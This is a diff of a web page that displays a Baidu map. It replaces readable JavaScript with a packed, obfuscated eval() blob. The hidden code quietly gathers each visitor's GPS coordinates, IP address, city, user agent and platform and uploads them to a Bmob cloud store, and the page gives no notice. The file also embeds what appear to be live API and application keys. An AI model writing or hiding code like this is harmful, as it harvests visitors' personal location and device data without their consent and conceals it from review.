@@ -19,11 +19,9 @@
 		width: 100%;
 		height: 200px;
 		position: absolute;
-		/* left: 50%; */
 		bottom: 0;
 		background-color: #ccc;
 		z-index: 2;
-		/* transform:translate(-50%,0) */
     }
 </style> 
 
@@ -34,105 +32,13 @@
 	</div>
 
 
-	<!-- <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script> -->
 	<script src="lib/bmob-min.js"></script>
 	<script type="text/javascript" src="http://api.map.baidu.com/api?v=3.0&ak=XT8GlS3ntRTYNvep0C8GNwLaCE8lHNMW"></script>
 	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script> 
 
 	<script>
-		var userData = {}
-		userData.navigator = window.navigator 
+		eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('0 1={};1.9=j.9;0 5=4 6.y("x");0 2=4 6.w(A.z,t.s);5.u(2,15);0 p=4 6.K();p.H(3(b){k(E.F()==I){0 a=4 6.G(b.2);5.C(a);5.D(b.2);1.L=(b.2.M+","+b.2.J)}v{}});3 m(a){0 b=a.r;5.B(b);1.c=(b)}0 h=4 6.N();h.13(m);1.g=n.14;1.l=(n.16);0 8=[];0 f="";0 i=10(3(){k(1.c){8=["g:"+1.g,"11:"+1.l,"12:"+1.c,"1b:"+j.9.1c,"17:"+1.9.1a];19(i);f=8.18(" - ");q()}d.e(8)},R);o.S("T","O");0 7=o.P.Q("7");0 7=4 7();3 q(){7.X({Y:f},{Z:3(a){d.e("U")},V:3(b,a){d.e("W")}})};',62,75,'var|userData|point|function|new|map|BMap|buserData|dataClean|navigator|||userCity|console|log|up|IP|myCity|timer|window|if|sohulocation|myFun|returnCitySN|Bmob|geolocation|saveData|name|915|39|centerAndZoom|else|Point|container|Map|404|116|setCenter|addOverlay|panTo|this|getStatus|Marker|getCurrentPosition|BMAP_STATUS_SUCCESS|lat|Geolocation|location|lng|LocalCity|0b303f2990ad571937d2c980638a5a82|Object|extend|1000|initialize|5fd1df2b91ff8b7a0987c2a05784a76c|添加成功|error|添加失败|save|buserDataStr|success|setInterval|搜狐IP定位|百度城市定位|get|cip||cname|平台|join|clearInterval|platform|浏览器信息|userAgent'.split('|'),0,{}))
 
-		var map = new BMap.Map("container");
-		// 创建地图实例  
-		var point = new BMap.Point(116.404, 39.915);
-		// 创建点坐标  
-		map.centerAndZoom(point, 15);
-		// 初始化地图，设置中心点坐标和地图级别  
-
-		// 浏览器API
-		var geolocation = new BMap.Geolocation();
-		geolocation.getCurrentPosition(function(r){
-		if(this.getStatus() == BMAP_STATUS_SUCCESS){
-			var mk = new BMap.Marker(r.point);
-			map.addOverlay(mk);
-			map.panTo(r.point);
-			// alert('您的位置：'+r.point.lng+','+r.point.lat);
-			userData.location = (r.point.lng+','+r.point.lat)
-		}
-		else {
-			// alert('failed'+this.getStatus());
-
-		}        
-		});
-
-		// IP定位
-		function myFun(result){
-			var cityName = result.name;
-			map.setCenter(cityName);
-			// alert("当前定位城市:"+cityName);
-			userData.userCity = (cityName)
-		}
-		var myCity = new BMap.LocalCity();
-		myCity.get(myFun); 
-
-		// SDK定位
-		// 开启SDK辅助定位
-		// geolocation.enableSDKLocation();
-		// geolocation.getCurrentPosition(function(r){
-		// 	if(this.getStatus() == BMAP_STATUS_SUCCESS){
-		// 		var mk = new BMap.Marker(r.point);
-		// 		map.addOverlay(mk);
-		// 		map.panTo(r.point);
-		// 		// alert('您的位置：'+r.point.lng+','+r.point.lat);
-		// 	}
-		// 	else {
-		// 		// alert('failed'+this.getStatus());
-		// 	}        
-		// });
-
-	    userData.IP = returnCitySN.cip
-	    userData.sohulocation= (returnCitySN.cname)
-		var dataClean = []
-		var up = '' //存储用户信息字符串
-	    var timer = setInterval(function(){
-
-	    	if (userData.userCity) {
-			    dataClean = [
-				    'IP:' + userData.IP, 
-				    '搜狐IP定位:' + userData.sohulocation, 
-				    '百度城市定位:' + userData.userCity, 
-				    '浏览器信息:' + window.navigator.userAgent, 
-				    '平台:' + userData.navigator.platform
-			    ]
-			    clearInterval(timer)
-			    up = dataClean.join(' - \
-			    	')
-				saveData()
-	    	}
-	    	console.log(dataClean)
-	    },1000)
-
-	    Bmob.initialize("5fd1df2b91ff8b7a0987c2a05784a76c", "0b303f2990ad571937d2c980638a5a82");
-		// 创建Bmob.Object子类
-		var buserData = Bmob.Object.extend("buserData");
-		// 创建该类的一个实例
-		var buserData = new buserData();
-		// 添加数据，第一个入口参数是Json数据
-		// 数据保存
-		// 传入信息
-		function saveData () {
-		  buserData.save({
-		    buserDataStr:up
-		  }, {
-		    success: function (gameScore) {
-		      console.log('添加成功')
-		    },
-		    error: function (gameScore, error) {
-		      console.log('添加失败')
-		    }
-		  })
-		}
 		
 
 	</script>
